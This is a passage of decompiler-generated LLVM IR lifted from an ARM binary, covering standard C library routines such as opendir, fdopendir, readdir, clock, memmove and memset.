  %v3_12754 = inttoptr i32 %v2_12754 to i32*
  store i32 %v0_12754, i32* %v3_12754, align 4
  %v1_12758 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_12758, i32* %v3_12754, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_12724, i32* @r5, align 4
  %v0_12760 = load i32, i32* @r7, align 4
  %v2_12760 = inttoptr i32 %v0_12724 to i32*
  store i32 %v0_12760, i32* %v2_12760, align 4
  %v0_12764 = load i32, i32* @r5, align 4
  %v1_12764 = add i32 %v0_12764, 20
  %v2_12764 = inttoptr i32 %v1_12764 to i32*
  %v3_12764 = load i32, i32* %v2_12764, align 4
  store i32 %v3_12764, i32* %r1.global-to-local, align 4
  %v2_1276c = call i32 @calloc(i32 1, i32 %v3_12764)
  %v2_12770 = icmp eq i32 %v2_1276c, 0
  store i32 %v2_1276c, i32* @r4, align 4
  %v1_12778 = load i32, i32* @r5, align 4
  %v2_12778 = add i32 %v1_12778, 12
  %v3_12778 = inttoptr i32 %v2_12778 to i32*
  store i32 %v2_1276c, i32* %v3_12778, align 4
  br i1 %v2_12770, label %dec_label_pc_12780, label %dec_label_pc_12790

dec_label_pc_12780:                               ; preds = %bb17
  %v0_12780 = load i32, i32* @r5, align 4
  store i32 %v0_12780, i32* @r0, align 4
  %v0_12784 = call i32 @free()
  %v0_12788 = load i32, i32* @r4, align 4
  br label %dec_label_pc_127c8

dec_label_pc_12790:                               ; preds = %bb17
  %v0_12794 = load i32, i32* @r6, align 4
  %v2_12794 = add i32 %v0_12794, -34032
  store i32 %v2_12794, i32* %r3.global-to-local, align 4
  %v1_1279c = inttoptr i32 %v2_12794 to i32*
  %v2_1279c = load i32, i32* %v1_1279c, align 4
  %v3_1279c = add i32 %v0_12794, -34028
  %v4_1279c = inttoptr i32 %v3_1279c to i32*
  %v5_1279c = load i32, i32* %v4_1279c, align 4
  store i32 %v5_1279c, i32* %r1.global-to-local, align 4
  %v6_1279c = add i32 %v0_12794, -34024
  %v7_1279c = inttoptr i32 %v6_1279c to i32*
  %v8_1279c = load i32, i32* %v7_1279c, align 4
  store i32 %v8_1279c, i32* %r2.global-to-local, align 4
  %v9_1279c = add i32 %v0_12794, -34020
  %v10_1279c = inttoptr i32 %v9_1279c to i32*
  %v11_1279c = load i32, i32* %v10_1279c, align 4
  store i32 %v11_1279c, i32* %r3.global-to-local, align 4
  %v12_1279c = add i32 %v0_12794, -34016
  %v1_127a8 = inttoptr i32 %v12_1279c to i32*
  %v2_127a8 = load i32, i32* %v1_127a8, align 4
  %v3_127a8 = add i32 %v0_12794, -34012
  %v4_127a8 = inttoptr i32 %v3_127a8 to i32*
  %v5_127a8 = load i32, i32* %v4_127a8, align 4
  store i32 %v2_127a8, i32* %stack_var_-32, align 4
  store i32 %v5_1279c, i32* %r1.global-to-local, align 4
  store i32 %v8_1279c, i32* %r2.global-to-local, align 4
  store i32 %v11_1279c, i32* %r3.global-to-local, align 4
  %v0_127b8 = load i32, i32* @r5, align 4
  %v1_127b8 = add i32 %v0_127b8, 24
  %v1_127bc = inttoptr i32 %v1_127b8 to i32*
  store i32 %v2_1279c, i32* %v1_127bc, align 4
  %v3_127bc = add i32 %v0_127b8, 28
  %v4_127bc = inttoptr i32 %v3_127bc to i32*
  %v5_127bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_127bc, i32* %v4_127bc, align 4
  %v6_127bc = add i32 %v0_127b8, 32
  %v7_127bc = inttoptr i32 %v6_127bc to i32*
  %v8_127bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_127bc, i32* %v7_127bc, align 4
  %v9_127bc = add i32 %v0_127b8, 36
  %v10_127bc = inttoptr i32 %v9_127bc to i32*
  %v11_127bc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_127bc, i32* %v10_127bc, align 4
  %v12_127bc = add i32 %v0_127b8, 40
  %v2_127c0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_127a8, i32* %r1.global-to-local, align 4
  %v1_127c4 = inttoptr i32 %v12_127bc to i32*
  store i32 %v2_127c0, i32* %v1_127c4, align 4
  %v3_127c4 = add i32 %v0_127b8, 44
  %v4_127c4 = inttoptr i32 %v3_127c4 to i32*
  %v5_127c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_127c4, i32* %v4_127c4, align 4
  %v0_127c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_127c8

dec_label_pc_127c8:                               ; preds = %bb, %dec_label_pc_12780, %dec_label_pc_12790
  %v0_127c8 = phi i32 [ 0, %bb ], [ %v0_12788, %dec_label_pc_12780 ], [ %v0_127c8.pre, %dec_label_pc_12790 ]
  store i32 %v3_12710, i32* @r4, align 4
  store i32 %v6_12710, i32* @r5, align 4
  store i32 %v9_12710, i32* @r6, align 4
  store i32 %v12_12710, i32* @r7, align 4
  ret i32 %v0_127c8

; uselistorder directives
  uselistorder i32 %v2_1276c, { 1, 0, 2 }
  uselistorder i32 %v0_12724, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 11, 10, 1, 6, 2, 7, 12, 8, 13, 9, 14, 3, 15, 4, 16, 0, 17, 5, 18 }
  uselistorder label %dec_label_pc_127c8, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_127e0 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_127e8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_12818, label %dec_label_pc_12800

dec_label_pc_12800:                               ; preds = %entry
  %v0_12804 = call i32 @__aeabi_read_tp()
  %v3_12808 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12808 = sext i16 %v3_12808 to i32
  %v0_1280c = load i32, i32* %r2.global-to-local, align 4
  %v1_1280c = sub i32 0, %v0_1280c
  store i32 %v1_1280c, i32* %r2.global-to-local, align 4
  %v3_12810 = add i32 %v4_12808, %v0_12804
  %v4_12810 = inttoptr i32 %v3_12810 to i32*
  store i32 %v1_1280c, i32* %v4_12810, align 4
  br label %dec_label_pc_1283c

dec_label_pc_12818:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_12818 = icmp slt i32 %arg1, 0
  br i1 %v1_12818, label %dec_label_pc_1283c, label %dec_label_pc_12820

dec_label_pc_12820:                               ; preds = %dec_label_pc_12818
  store i32 %v2_127e8, i32* @r1, align 4
  %v0_12824 = call i32 @fstat()
  %v1_12828 = icmp slt i32 %v0_12824, 0
  br i1 %v1_12828, label %dec_label_pc_12830, label %dec_label_pc_12844

dec_label_pc_12830:                               ; preds = %dec_label_pc_12820
  br label %dec_label_pc_1283c

dec_label_pc_1283c:                               ; preds = %dec_label_pc_12830, %dec_label_pc_12818, %dec_label_pc_12800
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12888

dec_label_pc_12844:                               ; preds = %dec_label_pc_12820
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1284c = load i32, i32* @r7, align 4
  %v3_12850 = call i32 @__GI___fcntl_nocancel(i32 %v0_1284c, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12858 = load i32, i32* @r7, align 4
  %v2_1285c = call i32 @fd_to_DIR(i32 %v0_12858, i32 %tmp)
  store i32 %v2_1285c, i32* %r1.global-to-local, align 4
  %v2_12860 = icmp eq i32 %v2_1285c, 0
  br i1 %v2_12860, label %dec_label_pc_12868, label %dec_label_pc_12888

dec_label_pc_12868:                               ; preds = %dec_label_pc_12844
  %v0_12878 = call i32 @__aeabi_read_tp()
  %v3_1287c = load i16, i16* @global_var_233d0.483, align 2
  %v4_1287c = sext i16 %v3_1287c to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12884 = add i32 %v4_1287c, %v0_12878
  %v4_12884 = inttoptr i32 %v3_12884 to i32*
  store i32 12, i32* %v4_12884, align 4
  %v0_12888.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12888

dec_label_pc_12888:                               ; preds = %dec_label_pc_12844, %dec_label_pc_1283c, %dec_label_pc_12868
  %v0_12888 = phi i32 [ %v2_1285c, %dec_label_pc_12844 ], [ 0, %dec_label_pc_1283c ], [ %v0_12888.pre, %dec_label_pc_12868 ]
  store i32 %v3_127e0, i32* @r7, align 4
  ret i32 %v0_12888

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_12888, { 2, 0, 1 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12898:
  %v0_12898 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12898, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12898
  %v2_128a0 = load i32, i32* @ip, align 4
  %v5_128a0 = sdiv i32 %v2_128a0, 4194304
  %v6_128a0 = and i32 %v5_128a0, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12898, %bb
  %v7_128a0 = phi i32 [ %arg1, %dec_label_pc_12898 ], [ %v6_128a0, %bb ]
  ret i32 %v7_128a0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_128a8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_128a8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_128b4 = call i32 @fstat()
  store i32 %v0_128b4, i32* @r5, align 4
  %v2_128b8 = icmp eq i32 %v0_128b4, 0
  br i1 %v2_128b8, label %dec_label_pc_128c0, label %dec_label_pc_12938

dec_label_pc_128c0:                               ; preds = %entry
  %v1_128c4 = and i32 %tmp4, 61440
  store i32 %v1_128c4, i32* @r3, align 4
  %v7_128c8 = icmp eq i32 %v1_128c4, 16384
  br i1 %v7_128c8, label %dec_label_pc_128e8, label %dec_label_pc_128d0

dec_label_pc_128d0:                               ; preds = %dec_label_pc_128c0
  %v0_128d4 = call i32 @__aeabi_read_tp()
  %v3_128d8 = load i16, i16* @global_var_233d0.483, align 2
  %v0_128dc = load i32, i32* @r5, align 4
  store i32 %v0_128dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1291c

dec_label_pc_128e8:                               ; preds = %dec_label_pc_128c0
  %v0_128e8 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_128f0 = call i32 @__libc_fcntl(i32 %v0_128e8, i32 3)
  %v7_128f4 = icmp eq i32 %v2_128f0, -1
  br i1 %v7_128f4, label %dec_label_pc_12938, label %dec_label_pc_128fc

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128e8
  %v1_128fc = urem i32 %v2_128f0, 4
  store i32 %v1_128fc, i32* %r3.global-to-local, align 4
  %v7_12900 = icmp eq i32 %v1_128fc, 1
  br i1 %v7_12900, label %dec_label_pc_12908, label %dec_label_pc_12924

dec_label_pc_12908:                               ; preds = %dec_label_pc_128fc
  %v0_1290c = call i32 @__aeabi_read_tp()
  %v3_12910 = load i16, i16* @global_var_233d0.483, align 2
  %v0_12914 = load i32, i32* @r5, align 4
  store i32 %v0_12914, i32* %r1.global-to-local, align 4
  %v0_12918 = load i32, i32* %r3.global-to-local, align 4
  %v1_12918 = add i32 %v0_12918, 21
  br label %dec_label_pc_1291c

dec_label_pc_1291c:                               ; preds = %dec_label_pc_128d0, %dec_label_pc_12908
  %v2_1291c.in = phi i16 [ %v3_128d8, %dec_label_pc_128d0 ], [ %v3_12910, %dec_label_pc_12908 ]
  %v1_1291c = phi i32 [ %v0_128d4, %dec_label_pc_128d0 ], [ %v0_1290c, %dec_label_pc_12908 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_128d0 ], [ %v1_12918, %dec_label_pc_12908 ]
  %v2_1291c = sext i16 %v2_1291c.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_1291c = add i32 %v1_1291c, %v2_1291c
  %v4_1291c = inttoptr i32 %v3_1291c to i32*
  store i32 %storemerge, i32* %v4_1291c, align 4
  %v0_1293c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1293c

dec_label_pc_12924:                               ; preds = %dec_label_pc_128fc
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12928 = load i32, i32* @r4, align 4
  %v2_1292c = call i32 @fd_to_DIR(i32 %v0_12928, i32 %tmp)
  store i32 %v2_1292c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1293c

dec_label_pc_12938:                               ; preds = %entry, %dec_label_pc_128e8
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12924, %dec_label_pc_1291c, %dec_label_pc_12938
  %v0_1293c = phi i32 [ %v2_1292c, %dec_label_pc_12924 ], [ %v0_1293c.pre, %dec_label_pc_1291c ], [ 0, %dec_label_pc_12938 ]
  ret i32 %v0_1293c

; uselistorder directives
  uselistorder i32 %v1_128fc, { 1, 0 }
  uselistorder i32 %v2_128f0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_1293c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12938, { 1, 0 }
  uselistorder label %dec_label_pc_1291c, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_12954 = load i32, i32* @r4, align 4
  %v6_12954 = load i32, i32* @r5, align 4
  %v9_12954 = load i32, i32* @r6, align 4
  %v12_12954 = load i32, i32* @r7, align 4
  %v15_12954 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r6, align 4
  %v1_12968 = add i32 %tmp, 24
  store i32 %v1_12968, i32* @r4, align 4
  %v4_1296c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 68) to i32*), align 4
  store i32 %v4_1296c, i32* %r1.global-to-local, align 4
  store i32 %v1_12968, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_12980 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12980)
  %v0_12994 = load i32, i32* @r6, align 4
  %v2_12994 = add i32 %v0_12994, 16
  %v3_12994 = inttoptr i32 %v2_12994 to i32*
  %v4_12994 = load i32, i32* %v3_12994, align 4
  store i32 %v4_12994, i32* @ip, align 4
  store i32 76192, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12994)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_129a4

dec_label_pc_129a4:                               ; preds = %dec_label_pc_129d4, %entry
  %v0_129a4 = load i32, i32* @r5, align 4
  %v1_129a4 = add i32 %v0_129a4, 4
  %v2_129a4 = inttoptr i32 %v1_129a4 to i32*
  %v3_129a4 = load i32, i32* %v2_129a4, align 4
  store i32 %v3_129a4, i32* %r2.global-to-local, align 4
  %v4_129a4 = add i32 %v0_129a4, 8
  %v5_129a4 = inttoptr i32 %v4_129a4 to i32*
  %v6_129a4 = load i32, i32* %v5_129a4, align 4
  %tmp10 = icmp ugt i32 %v6_129a4, %v3_129a4
  br i1 %tmp10, label %dec_label_pc_129d4, label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %dec_label_pc_129a4
  %v1_129b0 = inttoptr i32 %v0_129a4 to i32*
  %v2_129b0 = load i32, i32* %v1_129b0, align 4
  %v1_129b4 = add i32 %v0_129a4, 12
  %v2_129b4 = inttoptr i32 %v1_129b4 to i32*
  %v3_129b4 = load i32, i32* %v2_129b4, align 4
  store i32 %v3_129b4, i32* %r1.global-to-local, align 4
  %v1_129b8 = add i32 %v0_129a4, 20
  %v2_129b8 = inttoptr i32 %v1_129b8 to i32*
  %v3_129b8 = load i32, i32* %v2_129b8, align 4
  store i32 %v3_129b8, i32* %r2.global-to-local, align 4
  %v4_129bc = call i32 @__getdents(i32 %v2_129b0, i32 %v3_129b4, i32 %v3_129b8, i32 %v6_129a4)
  %tmp9 = icmp slt i32 %v4_129bc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_129cc

.thread:                                          ; preds = %dec_label_pc_129b0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12a00

dec_label_pc_129cc:                               ; preds = %dec_label_pc_129b0
  %v1_129cc = load i32, i32* @r5, align 4
  %v2_129cc = add i32 %v1_129cc, 8
  %v3_129cc = inttoptr i32 %v2_129cc to i32*
  store i32 %v4_129bc, i32* %v3_129cc, align 4
  %v0_129d0 = load i32, i32* @r7, align 4
  %v1_129d0 = load i32, i32* @r5, align 4
  %v2_129d0 = add i32 %v1_129d0, 4
  %v3_129d0 = inttoptr i32 %v2_129d0 to i32*
  store i32 %v0_129d0, i32* %v3_129d0, align 4
  %v0_129d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129d4

dec_label_pc_129d4:                               ; preds = %dec_label_pc_129a4, %dec_label_pc_129cc
  %v1_129e4 = phi i32 [ %v0_129a4, %dec_label_pc_129a4 ], [ %v0_129d4.pre, %dec_label_pc_129cc ]
  %v1_129d4 = add i32 %v1_129e4, 4
  %v2_129d4 = inttoptr i32 %v1_129d4 to i32*
  %v3_129d4 = load i32, i32* %v2_129d4, align 4
  store i32 %v3_129d4, i32* %r2.global-to-local, align 4
  %v1_129d8 = add i32 %v1_129e4, 12
  %v2_129d8 = inttoptr i32 %v1_129d8 to i32*
  %v3_129d8 = load i32, i32* %v2_129d8, align 4
  store i32 %v3_129d8, i32* %r1.global-to-local, align 4
  %v2_129dc = add i32 %v3_129d8, %v3_129d4
  store i32 %v2_129dc, i32* @r4, align 4
  %v1_129e0 = add i32 %v2_129dc, 4
  %v2_129e0 = inttoptr i32 %v1_129e0 to i32*
  %v3_129e0 = load i32, i32* %v2_129e0, align 4
  %v2_129e4 = add i32 %v1_129e4, 16
  %v3_129e4 = inttoptr i32 %v2_129e4 to i32*
  store i32 %v3_129e0, i32* %v3_129e4, align 4
  %v0_129e8 = load i32, i32* @r4, align 4
  %v1_129e8 = add i32 %v0_129e8, 8
  %v2_129e8 = inttoptr i32 %v1_129e8 to i16*
  %v3_129e8 = load i16, i16* %v2_129e8, align 2
  %v4_129e8 = zext i16 %v3_129e8 to i32
  %v0_129ec = load i32, i32* %r2.global-to-local, align 4
  %v1_129ec = load i32, i32* %r1.global-to-local, align 4
  %v2_129ec = add i32 %v1_129ec, %v0_129ec
  %v3_129ec = inttoptr i32 %v2_129ec to i32*
  %v4_129ec = load i32, i32* %v3_129ec, align 4
  store i32 %v4_129ec, i32* %r1.global-to-local, align 4
  %v2_129f0 = add i32 %v0_129ec, %v4_129e8
  %v2_129f4 = icmp eq i32 %v4_129ec, 0
  %v1_129f8 = load i32, i32* @r5, align 4
  %v2_129f8 = add i32 %v1_129f8, 4
  %v3_129f8 = inttoptr i32 %v2_129f8 to i32*
  store i32 %v2_129f0, i32* %v3_129f8, align 4
  br i1 %v2_129f4, label %dec_label_pc_129a4, label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129d4, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_12a0c = load i32, i32* @r6, align 4
  %v2_12a0c = add i32 %v0_12a0c, 44
  %v3_12a0c = inttoptr i32 %v2_12a0c to i32*
  %v4_12a0c = load i32, i32* %v3_12a0c, align 4
  call void @__pseudo_branch(i32 %v4_12a0c)
  %v0_12a18 = load i32, i32* @r4, align 4
  store i32 %v3_12954, i32* @r4, align 4
  store i32 %v6_12954, i32* @r5, align 4
  store i32 %v9_12954, i32* @r6, align 4
  store i32 %v12_12954, i32* @r7, align 4
  store i32 %v15_12954, i32* @lr, align 4
  ret i32 %v0_12a18

; uselistorder directives
  uselistorder i32 %v1_129e4, { 0, 2, 1 }
  uselistorder i32 %v6_129a4, { 1, 0 }
  uselistorder i32 %v0_129a4, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_129d4, { 1, 0 }
}

define i32 @function_12a2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a2c:
  %v0_12a2c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12a2c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12a2c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12a2c, %bb
  %v4_12a38 = phi i32 [ %arg1, %dec_label_pc_12a2c ], [ 0, %bb ]
  ret i32 %v4_12a38

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_12a3c = load i32, i32* @lr, align 4
  %v0_12a44 = call i32 @__aeabi_read_tp()
  %v3_12a48 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12a48 = sext i16 %v3_12a48 to i32
  %v2_12a4c = add i32 %v4_12a48, %v0_12a44
  store i32 %v0_12a3c, i32* @lr, align 4
  ret i32 %v2_12a4c
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_12a60 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_12a60, i32* @r0, align 4
  %v1_12a68 = call i32 @times(i32 %v2_12a60)
  %v2_12a6c = load i32, i32* %stack_var_-24, align 4
  %v2_12a70 = add i32 %v2_12a6c, %tmp
  %v2_12a78 = mul i32 %v2_12a70, 10000
  %v1_12a7c = and i32 %v2_12a78, 2147483632
  ret i32 %v1_12a7c

; uselistorder directives
  uselistorder i32 %v2_12a60, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_12a90 = call i32 @_memcpy()
  ret i32 %v0_12a90
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_12aa0 = call i32 @_memcpy()
  ret i32 %v0_12aa0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_12ab4 = icmp eq i32 %arg3, 8
  store i1 %v8_12ab4, i1* %cpsr_z.global-to-local, align 1
  %v5_12ab8 = icmp slt i32 %arg3, 8
  br i1 %v5_12ab8, label %dec_label_pc_12b18, label %dec_label_pc_12abc

dec_label_pc_12abc:                               ; preds = %entry
  %v4_12abc = mul i32 %arg2, 256
  %v5_12abc = or i32 %v4_12abc, %arg2
  %v4_12ac0 = mul i32 %v5_12abc, 65536
  %v5_12ac0 = or i32 %v4_12ac0, %v5_12abc
  store i32 %v5_12ac0, i32* @r1, align 4
  %v1_12ac457 = urem i32 %tmp, 4
  %v2_12ac458 = icmp eq i32 %v1_12ac457, 0
  store i1 %v2_12ac458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_12ac458, label %dec_label_pc_12ad4, label %bb

bb:                                               ; preds = %dec_label_pc_12abc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_12abc ]
  %v3_12ac859 = phi i32 [ %v6_12ac8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_12abc ]
  %v4_12ac8 = inttoptr i32 %v3_12ac859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_12ac8, align 1
  %v5_12ac8 = load i32, i32* @r3, align 4
  %v6_12ac8 = add i32 %v5_12ac8, 1
  store i32 %v6_12ac8, i32* @r3, align 4
  %v0_12acc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12ad8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_12acc.pr, label %dec_label_pc_12ad4, label %.thread

.thread:                                          ; preds = %bb
  %v2_12acc = add i32 %v0_12ad8.pr.pre, -1
  store i32 %v2_12acc, i32* %r2.global-to-local, align 4
  %v1_12ac4 = urem i32 %v6_12ac8, 4
  %v2_12ac4 = icmp eq i32 %v1_12ac4, 0
  store i1 %v2_12ac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ac4, label %dec_label_pc_12ad4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_12ac8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_12ac8.pre to i8
  br label %bb

dec_label_pc_12ad4:                               ; preds = %.thread, %bb, %dec_label_pc_12abc
  %v0_12ae028 = phi i32 [ %tmp, %dec_label_pc_12abc ], [ %v6_12ac8, %bb ], [ %v6_12ac8, %.thread ]
  %v0_12ad8.pr = phi i32 [ %arg3, %dec_label_pc_12abc ], [ %v0_12ad8.pr.pre, %bb ], [ %v2_12acc, %.thread ]
  %v0_12ad4 = load i32, i32* @r1, align 4
  store i32 %v0_12ad4, i32* %ip.global-to-local, align 4
  %v8_12ad810 = icmp eq i32 %v0_12ad8.pr, 8
  store i1 %v8_12ad810, i1* %cpsr_z.global-to-local, align 1
  %v5_12adc11 = icmp slt i32 %v0_12ad8.pr, 8
  br i1 %v5_12adc11, label %dec_label_pc_12b18, label %dec_label_pc_12ae0.preheader

dec_label_pc_12ae0.preheader:                     ; preds = %dec_label_pc_12ad4
  %v1_12ae046 = inttoptr i32 %v0_12ae028 to i32*
  store i32 %v0_12ad4, i32* %v1_12ae046, align 4
  %v3_12ae047 = add i32 %v0_12ae028, 4
  %v4_12ae048 = inttoptr i32 %v3_12ae047 to i32*
  %v5_12ae049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12ae049, i32* %v4_12ae048, align 4
  %v6_12ae050 = add i32 %v0_12ae028, 8
  store i32 %v6_12ae050, i32* @r3, align 4
  %v0_12ae451 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ae452 = add i32 %v0_12ae451, -8
  store i32 %v1_12ae452, i32* %r2.global-to-local, align 4
  %v5_12aec53 = icmp slt i32 %v1_12ae452, 8
  br i1 %v5_12aec53, label %dec_label_pc_12ae0.dec_label_pc_12b18.loopexit_crit_edge, label %dec_label_pc_12af0

dec_label_pc_12af0:                               ; preds = %dec_label_pc_12ae0.preheader, %dec_label_pc_12ad8.dec_label_pc_12ae0_crit_edge
  %v6_12ae055 = phi i32 [ %v6_12ae0, %dec_label_pc_12ad8.dec_label_pc_12ae0_crit_edge ], [ %v6_12ae050, %dec_label_pc_12ae0.preheader ]
  %v0_12ae054 = phi i32 [ %v12_12b0c, %dec_label_pc_12ad8.dec_label_pc_12ae0_crit_edge ], [ %v0_12ae028, %dec_label_pc_12ae0.preheader ]
  %v1_12af0 = inttoptr i32 %v6_12ae055 to i32*
  %v2_12af0 = load i32, i32* @r1, align 4
  store i32 %v2_12af0, i32* %v1_12af0, align 4
  %v3_12af0 = add i32 %v0_12ae054, 12
  %v4_12af0 = inttoptr i32 %v3_12af0 to i32*
  %v5_12af0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12af0, i32* %v4_12af0, align 4
  %v6_12af0 = add i32 %v0_12ae054, 16
  store i32 %v6_12af0, i32* @r3, align 4
  %v0_12af4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12af4 = add i32 %v0_12af4, -8
  store i32 %v1_12af4, i32* %r2.global-to-local, align 4
  %v5_12afc = icmp slt i32 %v1_12af4, 8
  br i1 %v5_12afc, label %dec_label_pc_12af0.dec_label_pc_12b18.loopexit_crit_edge, label %dec_label_pc_12b00

dec_label_pc_12b00:                               ; preds = %dec_label_pc_12af0
  %v1_12b00 = inttoptr i32 %v6_12af0 to i32*
  %v2_12b00 = load i32, i32* @r1, align 4
  store i32 %v2_12b00, i32* %v1_12b00, align 4
  %v3_12b00 = add i32 %v0_12ae054, 20
  %v4_12b00 = inttoptr i32 %v3_12b00 to i32*
  %v5_12b00 = load i32, i32* %ip.global-to-local, align 4
